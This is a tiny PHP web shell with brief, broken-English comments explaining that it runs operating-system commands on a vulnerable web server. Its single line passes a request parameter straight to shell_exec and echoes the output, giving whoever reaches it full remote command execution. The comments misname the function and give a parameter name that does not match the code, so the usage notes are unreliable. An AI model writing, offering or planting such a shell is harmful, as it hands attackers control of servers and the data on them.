/* this code is written in php and a smallest one but good enough to invoke the remote system os-shell if the vulnerbility
   exists in the web server */
   
 <?php highlight_string(shell_exec($_REQUEST['cmdshell'])) ?> //command argument would be passed through the cmdshell variable
  
  // exec_shell() function is well defined in php to invoke the operating system shell ...
  // append the string used in the $_REQUEST variable to execute the shell commands through php 
    by this ::: --->    url?cmd=command_name -->example .. 
 
